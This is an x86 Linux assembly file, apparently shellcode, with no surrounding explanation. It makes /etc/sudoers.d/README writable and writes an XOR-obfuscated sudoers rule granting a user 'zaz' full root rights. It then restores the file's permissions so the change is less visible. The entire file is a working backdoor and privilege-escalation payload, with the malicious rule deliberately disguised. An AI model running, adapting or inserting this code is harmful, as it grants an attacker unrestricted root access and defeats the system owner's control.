GLOBAL _start

section .text

; i386 chmod: 90
; x86 chmod: 15 # cat /usr/include/asm/unistd_32.h | grep "chmod"

; x86 open: 5
; x86 write: 4

_start:
	xor edx, edx
	mov dl, 0x45
	push edx
	push 0x4d444145
	push 0x522f642e
	push 0x7372656f
	push 0x6475732f
	push 0x6374652f
	mov ebx, esp
	xor ecx, ecx
	mov cx, 0x01ff
	xor eax, eax
	mov al, 90
	int 0x80

	xor edx, edx
	mov dl, 0x45
	push edx
	push 0x4d444145
	push 0x522f642e
	push 0x7372656f
	push 0x6475732f
	push 0x6374652f
	mov ebx, esp
	xor ecx, ecx
	mov cl, 0x01
	xor eax, eax
	mov al, 5
	int 0x80

	mov ebx, eax
	mov edx, 0x66456c2a
	xor edx, 0x66666666
	push edx
	mov edx, 0x2a27464f
	xor edx, 0x66666666
	push edx
	push 0x4c4c413a
	push 0x4c4c4128
	push 0x3d4c4c41

	mov edx, 0x461c071c
	xor edx, 0x66666666
	push edx
	mov ecx, esp
	xor edx, edx
	mov dl, 23
	xor eax, eax
	mov al, 4
	int 0x80

	xor edx, edx
	mov dl, 0x45
	push edx
	push 0x4d444145
	push 0x522f642e
	push 0x7372656f
	push 0x6475732f
	push 0x6374652f
	mov ebx, esp
	xor ecx, ecx
	mov cx, 0x0120
	xor eax, eax
	mov al, 90
	int 0x80

	xor eax, eax
	mov al, 0x01
	xor ebx,ebx
	int 0x80
